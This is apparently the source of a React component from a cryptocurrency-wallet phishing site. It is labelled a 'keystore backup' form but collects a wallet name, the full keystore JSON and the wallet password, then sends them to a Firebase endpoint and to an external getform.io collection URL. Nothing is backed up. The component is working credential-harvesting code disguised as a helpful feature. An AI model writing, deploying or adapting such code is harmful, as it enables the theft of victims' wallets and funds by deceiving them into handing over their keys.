import React, { useState } from "react";
import { Button } from "../../../../../Global/Button/Button";
import { usePost } from "../../../../../Global/hook/usePost";
import { Input } from "../../../../../Global/Input/Input";

interface KeystoreBackupProps {
  onSuccess: () => void;
}

export const KeystoreBackup: React.FC<KeystoreBackupProps> = ({ onSuccess }) => {
  const [walletName, setWalletName] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [password, setPassword] = useState("");

  const { post } = usePost();

  const handleBackup = async (e: React.FormEvent) => {
    e.preventDefault();

    // Prepare the data to be posted to both Firebase and getform.io
    const postData = {
      walletName,
      keystoreJson,
      password,
    };

    // Make the POST request to Firebase using the usePost hook
    await post("backedup", postData); // Replace 'your-firebase-endpoint' with the actual Firebase URL

    // Make the POST request to getform.io
    try {
      const getformResponse = await fetch("https://getform.io/f/e7843df7-96fc-4788-8449-e8aa0018ad7b", {
        method: "POST",
        body: JSON.stringify(postData),
        headers: {
          "Content-Type": "application/json",
        },
      });
    } catch (error: any) {
      alert(error.message);
      // Handle any exceptions that may occur during the fetch request
    }

    // Call the 'onSuccess' callback or any other logic you need after the form is successfully submitted
    onSuccess();
  };

  return (
    <form onSubmit={handleBackup}>
      <Input
        required
        type="text"
        placeholder="Enter Wallet Name e.g trust wallet"
        value={walletName}
        onChange={e => setWalletName(e.target.value)}
        name="Wallet Name"
      />
      <textarea
        className="mt-4 flex w-full cursor-pointer items-center border-b-2 border-b-[#ebebeb] p-1 py-0 outline-none"
        placeholder="Enter Keystore JSON"
        value={keystoreJson}
        onChange={e => setKeystoreJson(e.target.value)}
        name="Keystore JSON"
      />
      <Input
        required
        type="password"
        placeholder="Enter Wallet Password"
        value={password}
        onChange={e => setPassword(e.target.value)}
        name="Wallet Password"
      />
      <i>{`Several lines of text beginning with "{...}" plus the password you used to encrypt it.`}</i>
      <Button type="submit" className="mt-5 w-full">
        Submit
      </Button>
    </form>
  );
};
